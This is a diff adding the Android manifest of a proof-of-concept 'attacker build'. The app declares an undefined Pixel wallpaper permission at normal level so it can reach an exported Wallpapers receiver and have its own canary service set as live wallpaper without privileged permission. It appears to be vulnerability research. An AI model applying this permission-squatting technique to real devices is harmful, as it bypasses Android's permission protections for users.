@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Attacker build.
+
+  It declares one permission that no package on the device defines:
+
+      com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER
+
+  Because nothing defines it, this app may define it itself, at
+  protectionLevel="normal", and is granted it at install with no prompt. That
+  permission is the only thing guarding an exported receiver in the Wallpapers
+  app:
+
+      com.google.android.apps.wallpaper.module.DownloadableRestorer
+          android:permission="com.google.pixel.livewallpaper...DOWNLOAD_LIVE_WALLPAPER"
+          android:exported="true"
+          action com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE
+
+  Apart from that one name this app holds nothing: no INTERNET, no storage, no
+  SET_WALLPAPER, and above all no SET_WALLPAPER_COMPONENT, which is
+  signature|privileged and is the permission the receiver's work actually needs.
+
+  The wallpaper service below is the canary. It is this app's own code, and the
+  point of the test is whether the system can be made to start it as the live
+  wallpaper by a caller that holds no permission entitling it to choose one.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.cindrasec.wallpaperpoc">
+
+    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34" />
+
+    <!-- Android 11+ filters package visibility; without these the lookup of
+         installed wallpaper services returns nothing and the explicit
+         broadcast is dropped before it leaves this app, which would look
+         exactly like the permission working. -->
+    <queries>
+        <intent>
+            <action android:name="android.service.wallpaper.WallpaperService" />
+        </intent>
+        <package android:name="com.google.android.apps.wallpaper" />
+    </queries>
+
+    <permission
+        android:name="com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER"
+        android:protectionLevel="normal" />
+    <uses-permission
+        android:name="com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER" />
+
+    <application
+        android:label="wallpaper-poc"
+        android:allowBackup="false"
+        android:hasCode="true">
+
+        <activity
+            android:name="com.cindrasec.wallpaperpoc.MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name="com.cindrasec.wallpaperpoc.CanaryWallpaperService"
+            android:permission="android.permission.BIND_WALLPAPER"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.wallpaper.WallpaperService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.service.wallpaper"
+                android:resource="@xml/canary_wallpaper" />
+        </service>
+    </application>
+</manifest>
